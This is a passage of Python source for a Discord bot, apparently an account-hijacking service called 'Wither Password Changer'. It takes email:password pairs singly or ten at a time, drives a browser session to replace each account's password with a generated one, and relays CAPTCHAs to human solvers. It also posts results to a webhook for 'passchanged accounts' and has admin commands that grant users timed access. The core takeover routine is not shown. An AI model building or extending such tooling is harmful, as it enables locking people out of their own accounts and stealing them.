        await interaction.response.send_message(embed=create_embed(
            "<a:Wrong:1466073421275201661> Invalid Format", "Use: `email:password`", COLOR_ERROR),
                                                ephemeral=True)
        return

    email, password = emailpass.split(":", 1)
    email = email.strip()
    password = password.strip()

    if user_id in data_manager.processing_sessions:
        await interaction.response.send_message(embed=create_embed(
            "<a:Wrong:1466073421275201661> Session Active",
            "Complete or cancel your current process first. Use `/cancel`.",
            COLOR_WARNING),
                                                ephemeral=True)
        return

    await interaction.response.send_message(embed=create_embed(
        "🚀 Starting Process",
        f"Attempting to recover: `{email}`\n**Target Password:** `{final_newpass}`\n\nUpdates will be posted in this channel/DM.",
        COLOR_INFO))

    asyncio.create_task(
        process_account_full(email, password, user_id, interaction.channel,
                             final_newpass))


# Removed submit_captcha command


@bot.tree.command(name="status",
                  description="Check your session / process status")
@check_login()
async def check_status(interaction: discord.Interaction):
    user_id = interaction.user.id

    fields = [{
        "name": "<:password:1469702059904467057> Authentication",
        "value": "<a:tick:1454372387511472313> Logged In",
        "inline": True
    }]

    if user_id in data_manager.processing_sessions:
        session = data_manager.processing_sessions[user_id]
        fields.append({
            "name": "<:captcha:1469721591196680275> Active Process",
            "value": "CAPTCHA Pending",
            "inline": True
        })
        fields.append({
            "name": "<:Icon_Mail:1469702058868211815> Target Email",
            "value": f"`{session['email']}`",
            "inline": False
        })
        fields.append({
            "name": "<:captcha:1469721591196680275> CAPTCHA Attempts",
            "value": f"{session['captcha_attempts']} / 3",
            "inline": True
        })

        channel_id = session.get('channel_id')
        channel_mention = f"<#{channel_id}>" if channel_id else "Unknown"
        fields.append({
            "name": "<:location:1469727484755841156> Submit Location",
            "value": channel_mention,
            "inline": True
        })

        embed = create_embed("<:captcha:1469721591196680275> Active Session",
                             "You have a pending CAPTCHA.", COLOR_WARNING,
                             fields)
    else:
        fields.append({
            "name": "<:captcha:1469721591196680275> Active Process",
            "value": "<a:Wrong:1466073421275201661> None",
            "inline": True
        })
        embed = create_embed("<a:tick:1454372387511472313> Status OK", "Ready to process accounts.",
                             COLOR_SUCCESS, fields)

    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="stop",
                  description="Stop your current processing session")
@check_login()
async def cancel_process(interaction: discord.Interaction):
    user_id = interaction.user.id

    if user_id not in data_manager.processing_sessions:
        await interaction.response.send_message(embed=create_embed(
            "<a:Wrong:1466073421275201661> No Active Process",
            "You don't have an active process to stop.", COLOR_INFO),
                                                ephemeral=True)
        return

    session = data_manager.processing_sessions[user_id]

    try:
        session["driver"].quit()
    except:
        pass

    if os.path.exists(session.get("captcha_file", "")):
        try:
            os.remove(session["captcha_file"])
        except:
            pass

    del data_manager.processing_sessions[user_id]

    await interaction.response.send_message(
        embed=create_embed("<a:tick:1454372387511472313> Process Stopped",
                           "Your session has been terminated.", COLOR_SUCCESS))


@bot.tree.command(name="set_captcha_channel",
                  description="Set the channel for CAPTCHA input")
@app_commands.describe(channel="The channel where CAPTCHAs will be sent")
@app_commands.checks.has_permissions(administrator=True)
async def set_captcha_channel(interaction: discord.Interaction,
                              channel: discord.TextChannel):
    data_manager.config["captcha_channel_id"] = str(channel.id)
    data_manager.save_config()
    await interaction.response.send_message(embed=create_embed(
        "<a:tick:1454372387511472313> CAPTCHA Channel Set",
        f"CAPTCHAs will now be sent to {channel.mention}. The next message in that channel will be treated as the answer.",
        COLOR_SUCCESS),
                                            ephemeral=True)


@bot.tree.command(name="process_bulk",
                  description="Process multiple accounts (up to 10)")
@app_commands.describe(ac1="email:pass (1)",
                       ac2="email:pass (2)",
                       ac3="email:pass (3)",
                       ac4="email:pass (4)",
                       ac5="email:pass (5)",
                       ac6="email:pass (6)",
                       ac7="email:pass (7)",
                       ac8="email:pass (8)",
                       ac9="email:pass (9)",
                       ac10="email:pass (10)")
@check_login()
async def process_bulk(interaction: discord.Interaction,
                       ac1: str,
                       ac2: Optional[str] = None,
                       ac3: Optional[str] = None,
                       ac4: Optional[str] = None,
                       ac5: Optional[str] = None,
                       ac6: Optional[str] = None,
                       ac7: Optional[str] = None,
                       ac8: Optional[str] = None,
                       ac9: Optional[str] = None,
                       ac10: Optional[str] = None):
    user_id = interaction.user.id
    accounts = [
        ac for ac in [ac1, ac2, ac3, ac4, ac5, ac6, ac7, ac8, ac9, ac10] if ac
    ]

    # Check if user already has an active session
    if user_id in data_manager.processing_sessions:
        await interaction.response.send_message(embed=create_embed(
            "<a:Wrong:1466073421275201661> Session Active",
            "Complete or cancel your current process first. Use `/cancel`.",
            COLOR_WARNING),
                                                ephemeral=True)
        return

    await interaction.response.send_message(embed=create_embed(
        "<a:file:1469725213733163264> Bulk Process Started",
        f"Processing **{len(accounts)}** accounts. Passwords will be auto-generated.",
        COLOR_INFO))

    # Process in sequence to avoid overloading
    async def run_bulk():
        for ac in accounts:
            if ":" not in ac: continue
            email, password = ac.split(":", 1)
            email, password = email.strip(), password.strip()
            newpass = generate_wither_password()

            # Start process and wait for completion (simplified for bulk)
            # Since we need to wait for CAPTCHA per account, we just start the first one
            # and the user must solve it before the next one starts.
            await process_account_full(email, password, user_id,
                                       interaction.channel, newpass)

            # Wait until session is cleared before starting next
            while user_id in data_manager.processing_sessions:
                await asyncio.sleep(5)

            await asyncio.sleep(2)  # Small break

    asyncio.create_task(run_bulk())


# ADMIN COMMANDS


@bot.tree.command(name="panel", description="Admin Control Panel")
async def admin_panel(interaction: discord.Interaction):
    if interaction.user.id != ADMIN_IDS:
        await interaction.response.send_message(embed=create_embed(
            "<a:Wrong:1466073421275201661> Access Denied", "You are not allowed to use this command.",
            COLOR_ERROR),
                                                ephemeral=True)
        return

    stats = data_manager.stats
    embed = create_embed(
        "<:Admin:1469724795137425551> Admin Control Panel", "Wither Password Changer Bot Management",
        COLOR_PRIMARY, [{
            "name": "<a:stats:1466490600575729799> Stats",
            "value":
            f"**Users:** {len(data_manager.authorized_users)}\n**Active Sessions:** {len(data_manager.active_sessions)}\n**Processing:** {len(data_manager.processing_sessions)}",
            "inline": True
        }, {
            "name": "<a:stats:1466490600575729799> Totals",
            "value":
            f"**Total Processed:** {stats['total_processed']}\n**Success:** {stats['total_success']}\n**Failed:** {stats['total_failed']}",
            "inline": True
        }])

    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="auth",
                  description="Allows a user for using passchanger")
@app_commands.describe(user="...", duration="...")
async def authorize_user(interaction: discord.Interaction,
                         user: discord.Member,
                         duration: Optional[int] = None):
    if interaction.user.id != ADMIN_IDS:
        await interaction.response.send_message(embed=create_embed(
            "<a:Wrong:1466073421275201661> Access Denied", "You are not allowed to use this command.",
            COLOR_ERROR),
                                                ephemeral=True)
        return

    # If duration is provided, calculate expiry timestamp
    if duration is not None:
        expires_at = int(time.time()) + (duration * 60)
        data_manager.authorize_user(user.id, interaction.user.id, expires_at)
        msg = f"Granted access to {user.mention} for **{duration} minutes**"
    else:
        # Permanent access
        data_manager.authorize_user(user.id, interaction.user.id, None)
        msg = f"Granted **Permanent** access to {user.mention}"

    await interaction.response.send_message(
        embed=create_embed("<a:tick:1465706185834627153> User Authorized", msg, COLOR_SUCCESS))


@bot.tree.command(name="unauth",
                  description="Disallows a user from using passchanger")
@app_commands.describe(user="...")
async def revoke_user(interaction: discord.Interaction, user: discord.Member):
    if interaction.user.id != ADMIN_IDS:
        await interaction.response.send_message(embed=create_embed(
            "<a:Wrong:1466073421275201661> Access Denied", "You are not allowed to use this command.",
            COLOR_ERROR),
                                                ephemeral=True)
        return

    data_manager.revoke_user(user.id)
    await interaction.response.send_message(embed=create_embed(
        "<a:Wrong:1466073421275201661> User Revoked", f"Removed access for {user.mention}", COLOR_WARNING))


@bot.tree.command(name="list_authed", description="List all authorized users")
async def list_users(interaction: discord.Interaction):
    if interaction.user.id != ADMIN_IDS:
        await interaction.response.send_message(embed=create_embed(
            "<a:Wrong:1466073421275201661> Access Denied", "You are not allowed to use this command.",
            COLOR_ERROR),
                                                ephemeral=True)
        return

    user_list = []
    for user_id in data_manager.authorized_users:
        try:
            user = await bot.fetch_user(int(user_id))
            user_list.append(f"• **{user.name}** (`{user_id}`)")
        except:
            user_list.append(f"• Unknown (`{user_id}`)")

    await interaction.response.send_message(embed=create_embed(
        "👥 Authorized Users",
        "\n".join(user_list) if user_list else "No users", COLOR_PRIMARY),
                                            ephemeral=True)


@bot.tree.command(name="set_webhook",
                  description="Set the passchanged accounts webhook")
@app_commands.describe(url="...")
async def set_webhook(interaction: discord.Interaction, url: str):
    if interaction.user.id != ADMIN_IDS:
        await interaction.response.send_message(embed=create_embed(
            "❌ Access Denied", "You are not allowed to use this command.",
            COLOR_ERROR),
                                                ephemeral=True)
        return

    data_manager.config["webhook_url"] = url
    data_manager.save_config()
    await interaction.response.send_message(embed=create_embed(
        "✅ Webhook Configured", "Webhook URL updated successfully.",
        COLOR_SUCCESS),
                                            ephemeral=True)


# BOT SETUP
if __name__ == "__main__":
    TOKEN = os.getenv("DISCORD_TOKEN")
    if not TOKEN:
        print("❌ DISCORD_TOKEN environment variable is not set!")
        print("   On Render: go to Environment → Add DISCORD_TOKEN = your_bot_token")
        raise SystemExit(1)
    bot.run(TOKEN)
